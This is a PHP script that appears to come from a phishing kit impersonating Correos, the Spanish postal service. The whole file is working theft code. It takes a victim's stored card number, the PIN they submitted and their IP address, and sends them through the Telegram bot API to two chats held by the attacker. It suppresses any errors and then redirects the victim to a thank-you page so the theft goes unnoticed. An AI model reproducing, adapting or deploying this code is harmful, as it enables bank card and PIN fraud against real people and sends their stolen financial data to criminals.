<?php

session_start();
require_once "../settings/conf.php";


$message = "|━━━━━━【💰 CORREOS 🎭】━━━━━━ \r\n";
$message .="| 💳 CC : " . $_SESSION['card'] . "\r\n";
$message .="| 🏧 PIN : " . $_POST['pin'] . "\r\n";
$message .= " *━━━━━━【📍" . $_SESSION["IP"] . "📍】━━━━━━ \r\n";

$text = $message;

$msgId = array(
    TELEGRAM_CHAT_ID,
    TELEGRAM_CHAT_IDD,
);
$token = array(
    TELEGRAM_TOKEN,
    TELEGRAM_TOKEN,
);

for ($i = 0; $i < count($msgId); $i++) {
    $url = "https://api.telegram.org/bot".$token[$i].'/sendMessage?chat_id='.$msgId[$i].'&text='.urlencode($text);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
    $result = curl_exec($ch);
    curl_close($ch);
    $result_json = json_decode($result, True);
    if(isset($result_json['ok'])){
        if(isset($result_json['result'])){
            echo "";
        }else {
            //echo $result_json[\'description\'];
            echo "";
        }
    }else {
        //echo "Something went wrong";
        echo "";
    }
}

header("Location: ../Gracias.php?entrega_id=".md5("azuifgziaygyufgzaygfyu"));

?>